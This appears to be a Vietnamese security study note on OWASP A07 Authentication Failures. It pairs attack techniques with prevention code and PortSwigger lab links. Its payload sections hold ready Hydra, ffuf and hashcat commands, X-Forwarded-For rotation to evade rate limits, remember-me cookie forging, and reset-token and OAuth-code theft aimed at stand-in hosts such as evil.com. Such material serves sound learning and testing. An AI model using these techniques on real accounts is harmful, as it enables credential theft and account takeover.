# A07 – Authentication Failures

> **OWASP Top 10:2025 · #7** — Giữ nguyên vị trí #7 từ 2021, đổi tên chính xác hơn từ "Broken Authentication". Đây là danh mục có **Avg Weighted Exploit cao thứ 2 trong Top 10 (7.69)**, phản ánh mức độ dễ khai thác khi tìm được lỗ hổng. Với 36 CWEs được map và 1.1 triệu occurrences, authentication failure là con đường ngắn nhất để attacker trở thành người dùng hợp lệ — kể cả admin — mà không cần crack hash hay exploit code.

| Metric | Số liệu |
|---|---|
| CWE được map | 36 |
| CVEs liên quan | 7,147 |
| Tổng số lần xuất hiện | 1,120,673 |
| Tỉ lệ xuất hiện trung bình | 2.92% |
| Max Incidence Rate | 15.80% |
| Avg Weighted Exploit | 7.69 (cao thứ 2 Top 10) |

Notable CWEs: **CWE-287** (Improper Authentication), **CWE-384** (Session Fixation), **CWE-307** (No Brute-force Protection), **CWE-640** (Weak Password Recovery), **CWE-798** (Hard-coded Credentials), **CWE-613** (Insufficient Session Expiration).

---

## 📖 Concept

Authentication là quá trình **xác minh "bạn là ai"** — phân biệt rõ với Authorization (bạn được làm gì). Authentication Failures xảy ra khi attacker có thể **trick system nhận diện họ là user hợp lệ** thông qua khai thác điểm yếu trong cơ chế xác thực.

### Ba yếu tố xác thực (Authentication Factors)

| Factor | Loại | Ví dụ |
|---|---|---|
| **Something you know** | Knowledge factor | Password, PIN, security question |
| **Something you have** | Possession factor | OTP, TOTP app, hardware token, phone |
| **Something you are** | Inherence factor | Fingerprint, face ID, voice |

> ⚠️ **MFA** yêu cầu ít nhất **2 factor khác loại**. Dùng password + security question **không phải MFA** — cả hai đều là knowledge factor.

### App dễ bị tấn công khi:

| Điều kiện | Rủi ro |
|---|---|
| Cho phép automated attack (brute-force, credential stuffing) | Account takeover hàng loạt |
| Error message khác nhau giữa "wrong username" và "wrong password" | Username enumeration |
| Không có rate limit / lockout | Brute-force không giới hạn |
| Cho phép password yếu / default / đã bị breach | Dễ crack hoặc đoán |
| Thiếu MFA hoặc MFA có thể bypass | Single point of failure |
| Session ID trong URL / không regenerate sau login | Session fixation / hijacking |
| Session không expire sau logout / idle | Session không bị invalidate |
| Password reset token dự đoán được hoặc không expire | Account takeover qua reset |
| "Remember me" cookie dùng giá trị đoán được | Persistent auth bypass |
| SSO token không validate scope / audience | Cross-service auth bypass |

---

## 🎯 Các dạng tấn công

---

### 1. Username Enumeration — `Medium`

Attacker phân biệt username **tồn tại** hay **không tồn tại** dựa trên sự khác biệt trong response.

#### 3 kênh enumeration phổ biến:

**a) Error message khác nhau**
```
POST /login
username=admin&password=wrong
→ "Invalid password"          ← username tồn tại!

POST /login
username=notexist&password=wrong
→ "Invalid username or password"  ← username không tồn tại
```

**b) Status code khác nhau**
```
username=admin    → 302 Redirect (đúng user, sai pass)
username=notexist → 200 OK (sai user)
```

**c) Response time khác nhau (timing attack)**
```
# App check password chỉ khi username tồn tại:
username=admin    → response 350ms  (tìm user → hash password → compare)
username=notexist → response 50ms   (không tìm thấy → return ngay)

# Đặc biệt rõ khi password được hash bằng bcrypt (compute-intensive)
```

**d) Registration form**
```
POST /register
username=admin
→ "Username already taken"   ← admin tồn tại!
```

---

### 2. Password Brute-Force — `High`

#### 2.1. Basic Brute-force

```
# Sau khi enumerate được username
POST /login
username=admin&password=[WORDLIST]

# Tools:
# Burp Intruder: Sniper mode (1 payload position)
# Hydra: hydra -l admin -P rockyou.txt target.com http-post-form "/login:username=^USER^&password=^PASS^:Invalid"
# ffuf: ffuf -w passwords.txt -X POST -d "username=admin&password=FUZZ" -u https://target.com/login
```

#### 2.2. Credential Stuffing

```
# Dùng danh sách username:password từ data breach đã biết
# HaveIBeenPwned, RockYou, Collection #1-5...
# Vì người dùng thường reuse password:

python3 credential_stuffing.py --list breach_creds.txt --url https://target.com/login
```

#### 2.3. Password Spray (Hybrid)

```
# Thay vì brute-force 1 user với nhiều password
# → spray 1 password phổ biến lên NHIỀU username
# → tránh account lockout theo username

Cách 1 - Common passwords:
Password1, Password2025!, Summer2025!, Winter2026!

Cách 2 - Pattern theo tổ chức:
Company2025!, CompanyName123

Cách 3 - Increment từ leaked password:
ILoveMyDog6 → ILoveMyDog7 → ILoveMyDog8 (OWASP 2025 scenario)
Winter2025  → Winter2026
```

#### 2.4. Brute-force Protection Bypass

**a) IP Rotation**
```
# Nếu lockout theo IP:
# Thêm header để spoof IP
X-Forwarded-For: 1.2.3.4
X-Real-IP: 1.2.3.4
X-Remote-Addr: 1.2.3.4

# Rotate IP sau mỗi N request
# Dùng proxy list hoặc tor
```

**b) Account Lockout Bypass**

```
# Nếu lockout reset sau N lần đúng:
# Xen kẽ password đúng vào giữa các lần thử sai
wrong1 → wrong2 → CORRECT → wrong3 → wrong4 → CORRECT → ...
# Counter reset về 0 sau mỗi lần đúng → không bao giờ bị lock

# Nếu lockout theo username cụ thể:
# Dùng password spray (không focus 1 user)
```

**c) Rate Limit Bypass**

```
# Rate limit theo IP nhưng trust X-Forwarded-For:
X-Forwarded-For: 1.1.1.1   → 100 attempts
X-Forwarded-For: 1.1.1.2   → +100 attempts
X-Forwarded-For: 1.1.1.3   → +100 attempts

# Rate limit theo session: tạo nhiều session (đăng ký tài khoản mới)
```

---

### 3. Multi-Factor Authentication (MFA) Bypass — `High`

#### 3.1. Simple MFA Skip (Force Browse)

```
# Flow thông thường:
GET /login → POST /login (pass) → GET /mfa-verify → POST /mfa-verify → GET /my-account

# Nếu app chỉ check MFA ở bước 4 mà không check state:
POST /login (đúng credential) → bỏ qua /mfa-verify → GET /my-account trực tiếp
# → App check "đã login chưa?" nhưng không check "đã verify MFA chưa?"
```

#### 3.2. Flawed MFA Logic

```
# Sau khi pass bước 1 (username/password), app set cookie:
Cookie: account=wiener

# Bước 2: app dùng cookie để biết verify MFA cho ai:
POST /login2
Cookie: account=wiener   ← attacker đổi thành: account=carlos
mfa-code=123456          ← code của attacker (từ authenticator app của chính họ)

# Nếu app verify "code đúng format" mà không match với account đúng:
# → Attacker dùng MFA code của mình để bypass MFA của victim!
```

#### 3.3. Brute-force OTP

```
# OTP 6 chữ số = 1,000,000 combinations
# Nếu không có lockout/rate-limit sau N lần sai:
POST /mfa-verify
mfa-code=000000 → sai
mfa-code=000001 → sai
...
mfa-code=123456 → đúng!

# Burp Intruder: số payload 000000 → 999999
# Lưu ý: OTP expire sau 30-60s (TOTP) → cần race condition
# Hoặc OTP có window rộng hơn → có nhiều thời gian hơn để brute

# Bypass lockout: session reset sau mỗi lần đúng partial auth
```

---

### 4. "Remember Me" Cookie Attacks — `High`

```
# App implement "stay logged in" cookie với giá trị đoán được:

# Ví dụ 1: base64 encode của username:password
Cookie: stay-logged-in=d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYjQ0OTFkN2Vj
→ base64 decode: wiener:51dc30ddc473d43a6011e9eb44491d7ec
# Format rõ ràng là username:md5(password)

# Attack:
# 1. Tạo cookie với username=carlos + md5 của password phổ biến
# 2. Brute-force MD5 nếu có hash (MD5 crack cực nhanh)
# 3. Nếu biết password policy, enumerate possible passwords

stay-logged-in=base64(admin:md5(password123))
# → gửi request với cookie này → access admin account
```

---

### 5. Password Reset Vulnerabilities — `High`

#### 5.1. Password Reset Poisoning

```
# App tạo reset link dùng Host header:
POST /forgot-password
Host: target.com
username=carlos
# App gửi: https://target.com/reset?token=abc123

# Attack: inject Host header với attacker domain
POST /forgot-password
Host: evil.com
username=carlos
# App gửi: https://evil.com/reset?token=abc123 → email đến carlos
# Carlos click link → token lộ về server evil.com → attacker dùng token để reset!

# Bypass Host validation:
Host: target.com
X-Forwarded-Host: evil.com   ← nhiều app tin X-Forwarded-Host hơn

Host: evil.com:443@target.com  # Credential inject bypass
Host: target.com.evil.com      # Subdomain
```

#### 5.2. Predictable / Non-Expiring Reset Token

```
# Token dựa trên timestamp hoặc username:
token=md5(username + timestamp)  → brute-force nếu timestamp gần biết
token=base64(username)           → decode → forge

# Token không expire:
# Attacker request token, chờ 24h, dùng token cũ vẫn valid

# Token reuse: dùng lại token đã dùng → app không invalidate sau use

# Token leak qua Referer header:
POST /reset-password
# Sau reset, redirect về external → Referer: https://target.com/reset?token=abc
# External site log Referer → token bị leak!
```

#### 5.3. Broken Reset Logic (No User Ownership Verification)

```
# App có token nhưng không verify token khớp với user trong form:
POST /reset-password?token=VALID_TOKEN_FOR_CARLOS
password=newpassword123
username=administrator   ← attacker đổi username!
# Nếu app chỉ validate "token hợp lệ" mà không check "token thuộc về user này":
# → Thay đổi password của administrator bằng token của carlos!
```

#### 5.4. Security Question — `Low`

```
# "Tên thú cưng đầu tiên của bạn?"
# → Thông tin công khai trên Facebook/Instagram
# → Wordlist pet names

# "Thành phố sinh ra?"
# → LinkedIn profile, public records
```

---

### 6. Session Management Failures — `High`

#### 6.1. Session Fixation

```
# Attacker biết session ID trước (app không regenerate sau login)
# Bước 1: Attacker lấy session ID chưa auth
GET /login
→ Set-Cookie: session=KNOWN_SESSION_ID

# Bước 2: Attacker cho victim dùng session ID này
# (qua XSS, URL param, phishing link có ?sessionid=KNOWN_SESSION_ID)

# Bước 3: Victim login với session đó
# App authenticate victim nhưng KHÔNG TẠO session ID mới

# Bước 4: Attacker gửi request với KNOWN_SESSION_ID → đã auth là victim!
```

#### 6.2. Session Not Invalidated After Logout

```
# Victim logout → app delete cookie phía client
# Nhưng session ID vẫn valid phía server!
# Attacker (đã có session ID từ trước) vẫn dùng được sau khi victim "logout"

# Test: capture session ID → victim logout → dùng session ID cũ → vẫn work?

# SSO Single Logout (SLO) failure:
# Victim logout khỏi app A
# Nhưng app B vẫn có session hợp lệ (token SSO không được revoke)
# → Attacker trên app B vẫn access được account victim
```

#### 6.3. Session ID in URL

```
# Session ID trong URL → lộ qua Referer header, server log, browser history
GET /dashboard?sessionid=abc123xyz

# Attack: trick user click link → session ID lộ về attacker-controlled server
<a href="https://target.com/page?sessionid=abc123">Click here</a>
# Referer: https://target.com/page?sessionid=abc123 → lộ khi user click link ra ngoài
```

---

### 7. OAuth 2.0 Authentication Vulnerabilities — `Critical`

OAuth 2.0 là authorization framework nhưng thường được dùng cho authentication (social login). Specification linh hoạt + nhiều optional parameter → dễ implement sai.

#### OAuth 2.0 Flow (Authorization Code Grant)

```
1. Client App → Authorization Server:
GET /authorization?client_id=CLIENT_ID&redirect_uri=https://client.com/callback
                  &response_type=code&scope=openid%20profile&state=RANDOM_STATE

2. User login + consent → Authorization Server → redirect với code:
GET /callback?code=AUTH_CODE&state=RANDOM_STATE

3. Client App → Authorization Server (server-to-server):
POST /token
code=AUTH_CODE&client_id=...&client_secret=...&redirect_uri=...
→ { "access_token": "...", "token_type": "Bearer" }

4. Client App → Resource Server:
GET /userinfo
Authorization: Bearer ACCESS_TOKEN
```

#### 7.1. Flawed CSRF Protection (Missing `state` Parameter) — `High`

```
# state parameter = CSRF token cho OAuth flow
# Nếu app không validate state → CSRF attack:

# Attacker bắt đầu flow OAuth với account của mình
GET /authorization?client_id=...&redirect_uri=https://client.com/callback

# Lấy authorization code nhưng KHÔNG hoàn thành flow → chặn ở bước redirect
# Tạo link: https://client.com/callback?code=ATTACKER_CODE

# Victim click link (CSRF) → client app dùng attacker's code để fetch access token
# → Victim's account được "link" với attacker's social account
# → Attacker login bằng social account của mình → access victim's account!
```

#### 7.2. Authorization Code Leakage via `redirect_uri` — `Critical`

```
# App không validate redirect_uri đúng → attacker inject redirect_uri của mình

GET /authorization?client_id=CLIENT_ID
                 &redirect_uri=https://evil.com/steal   ← inject!
                 &response_type=code
                 &scope=openid profile

# Nếu Authorization Server không check whitelist redirect_uri:
# → User authorize → code được gửi đến evil.com
# → Attacker dùng code để lấy access token → access victim's data

# Bypass redirect_uri whitelist:
redirect_uri=https://legitimate.com.evil.com         # subdomain
redirect_uri=https://legitimate.com/callback?x=../../../evil  # path traversal
redirect_uri=https://legitimate.com@evil.com         # credential in URL
redirect_uri=https://legitimate.com/callback/../evil.com  # ../
redirect_uri=https://evil.com                        # thêm domain (nếu check substring only)

# Open Redirect chained với OAuth:
# Nếu app có open redirect: /redirect?url=https://evil.com
redirect_uri=https://legitimate.com/redirect?url=https://evil.com/steal
# → OAuth validate legitimate.com ✓ nhưng sau đó redirect đến evil.com → code bị steal
```

#### 7.3. Implicit Grant Type — Không Dùng Cho Authentication

```
# Implicit grant: access_token trả về TRỰC TIẾP trong URL fragment
GET /callback#access_token=TOKEN&token_type=Bearer

# Vì token trong URL → dễ leak qua Referer, browser history, log

# Improper implementation của implicit grant:
# App lấy user info từ resource server dùng access_token
# Nhưng không verify access_token match với user họ claim là

# Attack: attacker intercept/modify POST với user data
POST /authenticate
{"email":"victim@gmail.com","accessToken":"attacker_token"}
# Nếu app dùng email từ body để identify user (không verify từ token):
# → Login thành victim chỉ với valid access_token của bất kỳ Google account nào!
```

#### 7.4. Flawed Scope Validation — `High`

```
# Scope định nghĩa quyền truy cập được cấp
# Ví dụ: scope=openid profile email → chỉ đọc profile cơ bản

# Attack: thêm scope vào authorization request
GET /authorization?...&scope=openid profile email admin

# Nếu Authorization Server không restrict scope theo whitelist của client:
# → Attacker nhận access_token với quyền admin!

# Upgrade scope sau khi có token (nếu server cho phép):
POST /token/refresh
refresh_token=TOKEN&scope=admin   ← upgrade scope!
```

#### 7.5. OpenID Connect – Unprotected Dynamic Client Registration — `High`

```
# OpenID Connect cho phép client tự đăng ký (dynamic registration)
# Nếu endpoint này không authenticate:

POST /openid/register
{
  "redirect_uris": ["https://evil.com/steal"],
  "client_name": "evil_app",
  "logo_uri": "https://evil.com/logo.png"
}
→ { "client_id": "evil_client_id", "client_secret": "..." }

# Attacker có client_id hợp lệ → dùng trong authorization flow
# Nếu "logo_uri" hoặc các URI trong registration được fetch bởi server:
# → SSRF via logo_uri!

# request_uri parameter (JAR - JWT Authorization Request):
GET /authorization?request_uri=https://evil.com/evil.jwt
# Server fetch JWT từ URL → SSRF hoặc inject malicious JWT
```

---

### 8. Password Change Vulnerabilities — `Medium`

```
# Form đổi password: username hidden field + current password + new password
POST /change-password
username=wiener&current-password=peter&new-password=hacked123

# Nếu username lấy từ request body (không từ session):
POST /change-password
username=administrator&current-password=anything&new-password=hacked123
# → Nếu không verify current-password match với username từ session → change admin password!

# Nếu current-password không được verify:
POST /change-password
username=administrator&new-password=hacked123
# → Change password trực tiếp không cần current password!

# Bypass bằng cách drop current-password field hoàn toàn
```

---

### ⚠️ Hai dạng hay bị bỏ sót

**Timing attack trên login** — Dù response message giống nhau, compute time của bcrypt hash (chỉ khi user tồn tại) tạo ra timing difference ~100-500ms có thể đo được qua nhiều sample. Dùng Burp Intruder + grep response time.

**SSO Single Logout không được implement** — Logout khỏi một app trong SSO cluster không revoke token trên authorization server → tất cả app khác trong cluster vẫn accept token cũ cho đến khi hết hạn.

---

## 🔍 Dấu hiệu nhận biết

| Mức độ | Dấu hiệu | Cần làm |
|---|---|---|
| 🔴 High | Login error message khác nhau cho wrong user vs wrong pass | Dùng username enum để tìm valid username |
| 🔴 High | Không có rate-limit sau nhiều lần login sai | Brute-force với Burp Intruder / Hydra |
| 🔴 High | Có flow MFA nhưng có thể skip bước verify | Force browse đến /my-account sau login |
| 🔴 High | OAuth flow có `redirect_uri` param | Test URI manipulation, inject evil domain |
| 🔴 High | OAuth không có `state` param | Test CSRF attack trên OAuth flow |
| 🟡 Med | "Remember me" cookie trông như base64/hash | Decode, phân tích pattern, forge cookie |
| 🟡 Med | Password reset dùng Host header trong email | Test Host header injection, X-Forwarded-Host |
| 🟡 Med | Reset token trong URL có pattern timestamp/username | Test predictability, check expiration |
| 🟡 Med | Session ID không thay đổi sau login | Test session fixation |
| 🔵 Low | Session ID lộ trong URL | Check Referer leak |
| 🔵 Low | Session vẫn valid sau logout | Dùng lại session ID sau khi "logout" |

---

## 🧠 Attack Flow – Methodology

### Password-Based Auth Testing

```
1. Username Enumeration
   └─ Gửi request với username thật vs username giả
   └─ So sánh: response body, HTTP status, response time, response length
   └─ Burp Comparer để diff 2 response
   └─ Tìm username trong: profile URL, error message, email trong source HTML

2. Brute-force setup
   └─ Burp Intruder → Sniper mode → payload position trên password field
   └─ Wordlist: auth-lab-passwords, rockyou.txt, SecLists/Passwords/Common
   └─ grep "Invalid password" để flag wrong, "Welcome" để flag correct
   └─ Set follow redirect trong Intruder options

3. Bypass brute-force protection
   └─ Test X-Forwarded-For rotation (thêm vào Intruder → pitchfork với IP list)
   └─ Test account lockout reset: xen kẽ correct password của mình
   └─ Test multiple usernames với same password (spray)

4. Confirm với 2 account test
   └─ Tạo 2 account → verify logic hoạt động đúng trước khi attack production
```

### MFA Testing

```
1. Map full MFA flow trong Burp Proxy
   └─ Xác định các bước: /login → /login2 → /my-account

2. Test skip MFA
   └─ Sau POST /login thành công → navigate thẳng /my-account → có vào được không?
   └─ Thử bypass bằng cách drop POST /login2 request

3. Test flawed logic
   └─ Identify field xác định "verify MFA cho ai": username, cookie, hidden field
   └─ Đổi field đó sang victim username
   └─ Nhập MFA code của chính mình → check có vào account victim không?

4. Test brute-force OTP
   └─ Burp Intruder: 000000 → 999999 (Custom iterator hoặc number list)
   └─ Check lockout sau vài lần sai
   └─ Nếu session expire sau lockout → dùng Burp macro để auto re-login trước mỗi batch
```

### OAuth Testing

```
1. Identify OAuth flow
   └─ Tìm "Login with Google/GitHub/Facebook" button
   └─ Proxy traffic → tìm request đến /authorization với client_id, redirect_uri, state

2. Recon authorization server
   └─ GET /.well-known/oauth-authorization-server
   └─ GET /.well-known/openid-configuration
   └─ Tìm endpoints, supported grant types, scopes

3. Test CSRF (state parameter)
   └─ Bắt đầu OAuth flow → intercept redirect response
   └─ Kiểm tra state param có được validate không:
      - Drop state param → vẫn work?
      - Đổi state sang giá trị random → vẫn work?
   └─ Nếu không validate → CSRF attack khả thi

4. Test redirect_uri
   └─ Thêm extra path: redirect_uri=https://legit.com/callback/extra
   └─ Thêm subdomain: redirect_uri=https://evil.legit.com/callback
   └─ Open redirect chain: redirect_uri=https://legit.com/redirect?url=https://evil.com
   └─ Param traversal: redirect_uri=https://legit.com/callback%2f..%2fevil

5. Test implicit grant leakage
   └─ Check nếu access_token nằm trong URL fragment → leak qua Referer
   └─ Test modify user info trong POST /authenticate body

6. Test scope
   └─ Thêm scope không được cấp → server có reject không?
```

### Password Reset Testing

```
1. Test Host header injection
   └─ Intercept POST /forgot-password
   └─ Đổi Host: evil.com → kiểm tra link trong email có chứa evil.com không
   └─ Thử X-Forwarded-Host: evil.com (nếu Host bị validate)

2. Test token predictability
   └─ Request 3-5 token cho cùng 1 account, ghi lại thời gian
   └─ Phân tích entropy: có pattern không?
   └─ Test token expiration: token sau 1h, 24h có còn dùng được không?
   └─ Test reuse: sau khi đã dùng token → dùng lại → có bị reject?

3. Test ownership validation
   └─ Lấy reset token cho account A
   └─ Trong form reset, đổi username/email sang account B
   └─ Submit → password của account B có bị đổi không?

4. Test Referer leak
   └─ Complete password reset → check nếu có external link nào trên reset page
   └─ Token còn trong URL khi click link đó → Referer lộ token
```

---

## 💣 Payloads

### Username Enumeration

```
# Wordlist username phổ biến
admin, administrator, root, user, test, guest, info, support, webmaster
firstname.lastname@company.com (format từ công ty target)

# Burp Intruder – Sniper mode
POST /login
username=§FUZZ§&password=wrong_password

# Phân biệt: response length, status code, "Invalid password" vs "Invalid username"
```

### Brute-force Login

```bash
# Burp Intruder – Sniper (biết username, brute password)
POST /login
username=admin&password=§FUZZ§

# Hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com \
  http-post-form "/login:username=^USER^&password=^PASS^:Invalid password"

# Hydra với cookie (nếu cần CSRF token)
hydra -l admin -P passwords.txt target.com \
  http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid:H=Cookie: csrf=TOKEN"

# ffuf
ffuf -w passwords.txt:PASS \
  -X POST \
  -d "username=admin&password=PASS" \
  -u https://target.com/login \
  -mr "Welcome"
```

### X-Forwarded-For Rotation (Bypass IP Rate Limit)

```
# Burp Intruder – Pitchfork (2 payload positions)
POST /login
X-Forwarded-For: §IP§
username=admin&password=§PASS§

# Payload set 1: IP list (1.1.1.1, 1.1.1.2, 1.1.1.3...)
# Payload set 2: Password wordlist
# Pitchfork: pair IP với password → rotate IP đồng thời
```

### Remember Me Cookie Forge

```bash
# Decode và phân tích
echo "d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYjQ0OTFkN2Vj" | base64 -d
# → wiener:51dc30ddc473d43a6011e9eb44491d7ec

# MD5 bruteforce để tìm password từ hash
echo "51dc30ddc473d43a6011e9eb44491d7ec" > hash.txt
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt

# Forge cookie cho carlos (sau khi có password)
echo -n "carlos:$(echo -n 'found_password' | md5sum | cut -d' ' -f1)" | base64
```

### OAuth – redirect_uri Bypass

```
# Baseline (whitelist): redirect_uri=https://legitimate.com/callback

# Test thêm path:
redirect_uri=https://legitimate.com/callback/../extra
redirect_uri=https://legitimate.com/callback/extra

# Subdomain:
redirect_uri=https://evil.legitimate.com/callback

# Prefix match bypass:
redirect_uri=https://legitimate.com.evil.com

# Open redirect chain:
redirect_uri=https://legitimate.com/redirect?url=https://collaborator.net

# URL encoding:
redirect_uri=https://legitimate.com%2fcallback%2f..%2fevil.com
```

### Password Reset Poisoning

```http
POST /forgot-password HTTP/1.1
Host: legitimate.com
X-Forwarded-Host: evil.com
Content-Type: application/x-www-form-urlencoded

username=carlos
```

---

## 🛡️ Prevention

### Nguyên tắc: Defense in Depth cho Authentication

> Không có single control nào đủ — cần kết hợp rate limiting + MFA + anomaly detection + session management đúng cách.

### Checklist cho developer

- [ ] **Enforce MFA** cho mọi tài khoản quan trọng, đặc biệt admin
- [ ] **Error message đồng nhất** — "Invalid username or password" cho cả hai trường hợp
- [ ] **Rate limiting + lockout** — tối đa 5-10 lần sai → tăng delay hoặc lockout tạm thời (không permanent → DDoS risk)
- [ ] **Password requirements** theo NIST 800-63b: tối thiểu 8 ký tự, không force rotate định kỳ, check breach list
- [ ] **Argon2/bcrypt** cho password hash (xem A04) — không cho phép weak/default password
- [ ] **Regenerate session ID** ngay sau login thành công (chống session fixation)
- [ ] **Session expire**: inactivity timeout (15-30 phút) + absolute timeout (8-24h)
- [ ] **Invalidate server-side session** khi logout — không chỉ delete cookie client-side
- [ ] **Password reset token**: CSPRNG, single-use, expire sau 15-60 phút, không trong URL nếu có thể
- [ ] **OAuth**: validate `state`, whitelist `redirect_uri` chính xác, validate `aud`/`iss` của token
- [ ] **Log** tất cả authentication failure, detect pattern brute-force/stuffing, alert admin

### Fix Session Fixation

```python
# ❌ Không regenerate session sau login
def login(username, password):
    if verify(username, password):
        session['user'] = username  # Session ID giữ nguyên!
        return redirect('/home')

# ✅ Regenerate session ID sau login
def login(username, password):
    if verify(username, password):
        session.regenerate()  # Tạo session ID MỚI, xóa cũ
        session['user'] = username
        return redirect('/home')
```

### Fix OAuth redirect_uri

```python
# ❌ Substring check dễ bypass
ALLOWED = "https://legitimate.com"
if redirect_uri.startswith(ALLOWED):  # evil.legitimate.com cũng pass!
    proceed()

# ✅ Exact match whitelist
ALLOWED_REDIRECT_URIS = {
    "https://legitimate.com/callback",
    "https://legitimate.com/oauth/callback"
}
if redirect_uri not in ALLOWED_REDIRECT_URIS:
    raise ValueError("Invalid redirect_uri")
```

### Fix Rate Limiting

```python
# ✅ Progressive delay + lockout
from flask_limiter import Limiter

@app.route('/login', methods=['POST'])
@limiter.limit("5 per minute")  # IP-based
@limiter.limit("10 per hour")
def login():
    username = request.form['username']

    # Username-based lockout riêng
    if get_fail_count(username) >= 5:
        if last_fail_time(username) < 15 minutes ago:
            return "Account temporarily locked", 429
    ...
```

### Password Reset Best Practices

```python
import secrets
from datetime import datetime, timedelta

def generate_reset_token(user_id):
    token = secrets.token_urlsafe(32)  # CSPRNG, 256-bit entropy
    expiry = datetime.utcnow() + timedelta(minutes=15)  # expire sau 15 phút

    # Lưu token đã hash (không lưu plaintext)
    token_hash = hashlib.sha256(token.encode()).hexdigest()
    db.save_reset_token(user_id, token_hash, expiry)

    return token  # Gửi plaintext qua email

def verify_reset_token(token):
    token_hash = hashlib.sha256(token.encode()).hexdigest()
    record = db.get_reset_token(token_hash)

    if not record:
        return None  # Token không tồn tại hoặc đã dùng
    if record.expiry < datetime.utcnow():
        return None  # Token hết hạn
    if record.used:
        return None  # Token đã dùng

    db.mark_token_used(token_hash)  # Invalidate ngay sau dùng
    return record.user_id
```

---

## 🧪 Labs – PortSwigger Web Security Academy

### Authentication – Password-Based

| Lab | Level | Kỹ thuật |
|---|---|---|
| [Username enumeration via different responses](https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses) | 🟡 Apprentice | Error message khác nhau → enum username → brute password |
| [2FA simple bypass](https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-simple-bypass) | 🟡 Apprentice | Skip MFA step bằng force browse |
| [Password reset broken logic](https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-broken-logic) | 🟡 Apprentice | Reset token không validate ownership |
| [Username enumeration via subtly different responses](https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-subtly-different-responses) | 🔴 Practitioner | Typo nhỏ trong error message (Burp grep exact match) |
| [Username enumeration via response timing](https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-response-timing) | 🔴 Practitioner | Timing attack + X-Forwarded-For bypass |
| [Broken brute-force protection, IP block](https://portswigger.net/web-security/authentication/password-based/lab-broken-bruteforce-protection-ip-block) | 🔴 Practitioner | Xen kẽ correct login để reset counter |
| [Username enumeration via account lock](https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-account-lock) | 🔴 Practitioner | Lockout chỉ xảy ra cho valid username |
| [Broken brute-force protection, multiple credentials per request](https://portswigger.net/web-security/authentication/password-based/lab-broken-brute-force-protection-multiple-credentials-per-request) | ⭐ Expert | JSON array bypass: `["pass1","pass2",...]` |

### Authentication – MFA

| Lab | Level | Kỹ thuật |
|---|---|---|
| [2FA simple bypass](https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-simple-bypass) | 🟡 Apprentice | Force browse bỏ qua /login2 |
| [2FA broken logic](https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-broken-logic) | 🔴 Practitioner | Cookie `verify=carlos` → dùng OTP của mình để verify cho carlos |
| [2FA bypass using a brute-force attack](https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-bypass-using-a-brute-force-attack) | ⭐ Expert | Brute OTP + Burp macro tự động re-login giữa mỗi request |

### Authentication – Other Mechanisms

| Lab | Level | Kỹ thuật |
|---|---|---|
| [Brute-forcing a stay-logged-in cookie](https://portswigger.net/web-security/authentication/other-mechanisms/lab-brute-forcing-a-stay-logged-in-cookie) | 🔴 Practitioner | Decode cookie base64(user:md5(pass)) → brute MD5 |
| [Offline password cracking](https://portswigger.net/web-security/authentication/other-mechanisms/lab-offline-password-cracking) | 🔴 Practitioner | XSS steal remember-me cookie → crack MD5 offline |
| [Password reset via email host header](https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-via-email-host-header) | 🔴 Practitioner | Host header injection → leak reset token |
| [Password reset broken logic](https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-broken-logic) | 🟡 Apprentice | Token không validate, đổi username trong form |
| [Password brute-force via password change](https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-brute-force-via-password-change) | 🔴 Practitioner | Change password form không rate-limit, brute current password |

### OAuth Authentication

| Lab | Level | Kỹ thuật |
|---|---|---|
| [Authentication bypass via OAuth implicit flow](https://portswigger.net/web-security/oauth/lab-oauth-authentication-bypass-via-oauth-implicit-flow) | 🔴 Practitioner | Modify email trong POST /authenticate body |
| [Forced OAuth profile linking](https://portswigger.net/web-security/oauth/lab-oauth-forced-oauth-profile-linking) | 🔴 Practitioner | CSRF vì thiếu state param → link attacker social account với victim |
| [OAuth account hijacking via redirect_uri](https://portswigger.net/web-security/oauth/lab-oauth-account-hijacking-via-redirect_uri) | 🔴 Practitioner | Inject redirect_uri → auth code leak về evil server |
| [Stealing OAuth access tokens via an open redirect](https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect) | ⭐ Expert | Open redirect chain → access token trong fragment leak |
| [SSRF via OpenID dynamic client registration](https://portswigger.net/web-security/oauth/openid/lab-oauth-ssrf-via-openid-dynamic-client-registration) | 🔴 Practitioner | `logo_uri` trong dynamic registration → SSRF |
| [Stealing OAuth access tokens via a proxy page](https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-a-proxy-page) | ⭐ Expert | postMessage leak access token qua proxy iframe |

---

## 🔧 Tools

| Tool | Mục đích |
|---|---|
| **Burp Intruder** | Brute-force login, enumerate username, brute OTP, spray password |
| **Burp Sequencer** | Phân tích entropy session token, reset token |
| **Burp Macro** | Auto re-login giữa MFA brute-force requests |
| **Hydra** | Brute-force login (HTTP form, HTTP basic, SSH, FTP...) |
| **ffuf** | Fast fuzzing login endpoint với wordlist |
| **hashcat** | Crack hash từ remember-me cookie (MD5, bcrypt...) |
| **jwt_tool** | Test JWT auth (xem A04) |
| **oauth2-proxy** | Test OAuth flows |
| **HaveIBeenPwned API** | Check username/email có trong breach không |
| **SecLists** | Wordlist username, password (phổ biến nhất) |

---

## 🌍 Real-world Cases

**Case 1 – Dropbox (2012): 68 triệu credential**

Dropbox bị credential stuffing sau khi LinkedIn bị breach. Attacker dùng credential từ LinkedIn → test trên Dropbox → hàng triệu user dùng cùng password trên cả hai site. Root cause: không có MFA bắt buộc, không detect credential stuffing pattern. Password được lưu bằng bcrypt nhưng một số bằng SHA1 không salt — các hash đơn giản bị crack nhanh.

